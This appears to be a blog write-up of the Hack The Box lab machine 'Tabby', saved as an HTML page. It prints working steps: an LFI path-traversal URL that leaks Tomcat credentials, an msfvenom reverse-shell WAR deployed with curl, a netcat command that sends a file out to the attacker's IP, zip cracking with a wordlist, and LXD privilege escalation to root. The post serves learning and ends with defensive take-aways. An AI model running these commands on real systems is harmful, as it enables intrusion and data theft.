@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en"><meta charset="utf-8"><meta name="generator" content="Hugo 0.74.1" /><meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="color-scheme" content="light dark">
+<meta name="supported-color-schemes" content="light dark"><title>HTB Tabby&nbsp;&ndash;&nbsp;The Wolf Den</title><link rel="stylesheet" href="/css/core.min.ab321a2ad61315bebb72e6e3fa1108c4e8ffe4eada5cf5f20131d183a523496246d761df8fc832549be5b9dd47c40509.css" integrity="sha384-qzIaKtYTFb67cubj&#43;hEIxOj/5OraXPXyATHRg6UjSWJG12Hfj8gyVJvlud1HxAUJ"><meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="HTB Tabby" /><body><section id="header">
+    <div class="header wrap"><span class="header left-side"><a class="site home" href="/"><span class="site name">The Wolf Den</span></a></span>
+        <span class="header right-side"><div class="nav wrap"><nav class="nav"><a class="nav item" href="/ctf-writeups">CTF Writeups</a><a class="nav item" href="/htb-writeups">HTB Writeups</a><a class="nav item" href="/about">About</a></nav></div></span></div></section><section id="content"><div class="article-container"><section class="article header">
+    <h1 class="article title">HTB Tabby</h1></section><article class="article markdown-body"><h1 id="tabby">Tabby</h1>
+<p><img  src="/img/Tabby_Logo.png"
+        alt/></p>
+<p>Tabby has a Tomcat server that doesn&rsquo;t seem to have vulnerability we can exploit. But we chaining an LFI allows us to make use of it. Containers also prove to be useful for more than what they were intended for.</p>
+<h2 id="scanning-and-enumeration">Scanning and enumeration</h2>
+<p>We start off, as always, with an NMAP scan to get an idea of what we are working with.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nightwolf@kali:~/CTFs/HTB/Tabby$ nmap -sV -sC 10.10.10.194
+Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2020-07-03 07:11 MDT
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.194
+Host is up <span style="color:#f92672">(</span>0.080s latency<span style="color:#f92672">)</span>.
+Not shown: <span style="color:#ae81ff">997</span> closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp   open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Mega Hosting
+8080/tcp open  http    Apache Tomcat
+|_http-title: Apache Tomcat
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>SSH is potentially something to look at but the version doesn&rsquo;t have any vulnerabilities that seem useful to us and blind bruteforcing it is generally not the style of HTB.</p>
+<p>Thus we are left with the Apache Server and the Tomcat Server.</p>
+<p><img  src="/img/Tabby_MegaHostingHomePage.png"
+        alt/></p>
+<p>Looks like this company may have had some recent challenges.</p>
+<p><img  src="/img/Tabby_DataBreach.png"
+        alt/></p>
+<p>It does seem that there might be local file inclusion in from the news page. <code>http://megahosting.htb/news.php?file=statment</code>but we don&rsquo;t have access to /etc/passwd.</p>
+<p>That leaves us with port 8080.</p>
+<p>We head over there and find a default page for Tomcat 9.It also contains links to a number of other pages.</p>
+<p><img  src="/img/Tabby_TomcatDefaultPage.png"
+        alt/></p>
+<p><code>/docs</code> Contains some handy documentation when we will need shortly.</p>
+<p><code>/examples</code> has a number of default example Tomcat applications. My initial thought was that one of these would allow us some kind of code execution or something similar. However, this was not the case.</p>
+<p><code>/manger</code> Takes us to a page that has links to both the docs and example applications. It also contains links to two different control panels, the Manager App and the Host Manager App. Both of these require credentials to access and, at this point, we have none.</p>
+<h2 id="first-credentials">First Credentials</h2>
+<p>Now what are we todo? Eventually, you come to the conclusion it is time to read the Tomcat documentation. We then learn that access to the two manager control panels is controlled via a XML file located in <code>${CATALINA_BASE}/conf/tomcat-users.xml</code></p>
+<p>Perhaps this is the time to make use of the LFI we discovered earlier. However, we need to know where to find the XML file. You can spend quite a while researching and looking through documentation to find this info. However, it is much easier to install Tomcat on your local machine. Docker is an excellent way to do this. You can then use the locate command to find where tomcat-users.xml is stored. First update the database with <code>sudo updatedb</code> then <code>locate tomcat-users.xml</code></p>
+<p><img  src="/img/Tabby_TomcatUsersXML.png"
+        alt/></p>
+<p>We have a few options here in part because I had done some odd things on my local system. <code>usr/share/tomcat9/etc/tomcat-users.xml</code> is the one we are looking for though. Now to see if we can get to it.</p>
+<p>Sure enough we can. <code>http://10.10.10.194/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml</code></p>
+<p>Just as we hoped we find some credentials we can use.</p>
+<p><img  src="/img/Tabby_TomcatLFI.png"
+        alt/></p>
+<p>We can see that we also have certain roles. We can access the host manager gui but not the manager gui. Which would have allows us to upload a shell. However, we can use Curl to accomplish the same thing because we do have access to the scripting interface via the <code>manager-script</code> role</p>
+<h2 id="shell">Shell</h2>
+<p>Now that we have a login we need to get a shell. We can&rsquo;t just upload a PHP shell unfortunately. But we can upload a war (Web Application Resource), which can be used to hold a collection of jar files. The good news is it fairly easy to create a reverse war shell with msfvenom.<br>
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.15.245 LPORT=3698 -f war &gt; calc.war</code></p>
+<p>This gives us a reverse shell named calc.war. Very stealthy. :-)</p>
+<p>Now we turn back to the docs in order to figure out how to get this file on the server. Eventually we find the paths we need.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">curl -u <span style="color:#e6db74">&#39;tomcat&#39;</span>:<span style="color:#e6db74">&#39;$3cureP4s5w0rd123!&#39;</span> -T calc.war  http://10.10.10.194:8080/manager/text/deploy?path<span style="color:#f92672">=</span>/calc-example
+curl -u <span style="color:#e6db74">&#39;tomcat&#39;</span>:<span style="color:#e6db74">&#39;$3cureP4s5w0rd123!&#39;</span> http://10.10.10.194:8080/manager/text/list
+curl -u <span style="color:#e6db74">&#39;tomcat&#39;</span>:<span style="color:#e6db74">&#39;$3cureP4s5w0rd123!&#39;</span> http://10.10.10.194:8080/calc-example/
+</code></pre></div><p>We set up a listener with <code>nc -lnvp 3698</code>and run the commands above. After a short time, we receive a connection. We then use python to stabilize our shell a bit so it&rsquo;s a bit harder to crash. <code>python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>
+<h2 id="usertxt">User.txt</h2>
+<p>We do some basic enumeration an find that user.txt is in the home directory of a user named Ash. Sadly, we don&rsquo;t have access so we need to find a way to escalate our privileges. We pull linpeas over and run through though the results.  We find a backup zip file called, <code>16162020_backup.zip</code></p>
+<p>Because it is password protected we transfer it over to our personal machine with netcat.
+On the attacker machine: <code>nc -l -p 1234 &gt; backup.zip</code>
+On the target machine: <code>nc -w 3 10.10.15.245 1234 &lt; out.file</code> (add correct file)</p>
+<p>We crack it open with fcrackzip and rockyou.txt
+<code>fcrackzip -D -u -p /usr/share/wordlists/rockyou.txt</code>
+The password is <code>admin@it</code>. It could be that this is also the password for the Ash user.</p>
+<p>We switch back over to our revers shell and attempt to use su to switch to ash with admin@it as the password and we are successful! Cat user.txt and we are ready to tackle root.</p>
+<h2 id="roottxt">Root.txt</h2>
+<p>We starting doing some basic enumeration of our new user Ash, and noticed though that we are part of the LXC user group. LXC is a lightweight container to virtualize Linux. From my understanding, is somewhat similar to docker in some aspects.</p>
+<p>The important bit is that we can create container as a root without sudo permissions and then mount the host filesystem giving us read write access as root. I used this article as a refence and it worked fairly well though I would recommend using a different container as the one they reference seems to be a bit bugged. <a href="https://www.hackingarticles.in/lxd-privilege-escalation/">https://www.hackingarticles.in/lxd-privilege-escalation/</a></p>
+<p>First we create a new lxc image on our host machine. Then we transfer it to the Tabby using the inverse of our previous netcat commands. This had to be done in Ash&rsquo;s home directory. Some odd things were going on with the filesystem so I was unable to bring it to a temp directory.</p>
+<p>Now we import the image <code>lxc image import ./[name image file] --alias myname</code></p>
+<p>Then we check to make sure it imported successfully with <code>lxc image list</code></p>
+<p>Now we need to start the container and a shell for us to us.</p>
+<pre><code>lxc init myimage ignite  -c security.privilaged=true
+lxc config device add ignite mydevice disk source =/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+</code></pre><p>We can make sure we are root with <code>id</code>.</p>
+<p>Now we are golden. Mount the root directory, cat that flag, and submit away!</p>
+<pre><code>mnt/root/root
+cat root.txt
+</code></pre><h2 id="take-aways">Take Aways</h2>
+<ul>
+<li>LFI can be dangerous even when it doesn&rsquo;t grant access straight to /etc/passwd. Root web directories can leak data and potentially open a path to privilege escalation</li>
+<li>Passwords are important to keep unique. Don&rsquo;t use the same password for multiple things even on the same system.</li>
+<li>I think it should be pretty clear that LXC privileges can be a hazard to grant. Secure the accounts.</li>
+</ul>
+<h2 id="wrap-up">Wrap up</h2>
+<p>This box was a pretty interesting one. I got stuck on a few things right in front of my nose for a while but I had a fairly clear idea of how to get a foot hold from spending just a bit of time on the box. The tricky part was often figuring out how to do what I needed.</p>
+<p>It was a pretty fun box and I&rsquo;m glad I took the time to complete it. Thanks egre55 for creating it!</p>
+</article></div>
+<div class="article bottom"><section class="article navigation"><p><a class="link" href="/htb-writeups/admirer_writeup/"><span class="iconfont icon-article"></span>HTB Admirer</a></p></section></div></section><section id="footer"><div class="footer-wrap">
+    <p class="copyright">The Wolf Den</p>
+    <p class="powerby"><span>Powered&nbsp;by&nbsp;</span><a href="https://gohugo.io" 
+        target="_blank">Hugo</a><span>&nbsp;&amp;&nbsp;</span><a href="https://themes.gohugo.io/hugo-notepadium/" 
+        target="_blank">Notepadium</a></p></div></section></body>
+
+</html>
